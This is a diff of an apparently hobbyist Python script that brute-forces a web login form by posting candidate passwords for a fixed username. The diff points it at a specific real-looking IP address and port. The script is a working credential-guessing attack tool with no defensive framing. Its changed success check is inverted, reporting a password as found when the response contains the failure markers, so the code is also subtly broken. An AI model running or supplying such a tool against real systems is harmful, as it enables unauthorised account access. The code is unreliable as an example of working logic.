@@ -4,27 +4,28 @@ import random
 import string
 import json
 
-target_url = 'http://example.com/login.html'
-if_contains_then_invalid[] = {}
+target_url = 'http://83.160.88.114:8080'
+target_username = 'user'
+if_contains_then_invalid = ['not permission', 'is_invalid']
 
 def post_it(password):
 
     password = password.lower()
     
-    # chars = string.ascii_letters + string.digits
-    # random.seed = (os.urandom(1024))
+    # password = string.ascii_letters + string.digits
+    # password = (os.urandom(1024))
     # password = password.join(random.choice(string.digits)) // Salt
     # password = password.join(random.choice(chars) for i in range(8))
 
-    response = requests.post(url, allow_redirects=False, data={
-    	'username': username, # 'username-element-name': 'entered-target-username'
+    response = requests.post(target_url, allow_redirects=False, data={
+    	'username': target_username, # 'username-element-name': 'entered-target-username'
     	'password': password, # 'password-element-name': 'password-from-json'
         'Submit': "submit"
     })
-
-    print('testing password+'+password+' on '+username+'\t'+str(response.content))
-    if if_contains_then_invalid not in str(response.content):
-        print("[+] {}s password is {}".format(username, password))
+    
+    print('testing password '+password+' on '+target_username)
+    if any(if_contain_then_invalid in str(response.content) for if_contain_then_invalid in if_contains_then_invalid):
+        print("[+] {}s password is {}".format(target_username, password))
         exit(0)
 
 if __name__ == "__main__":
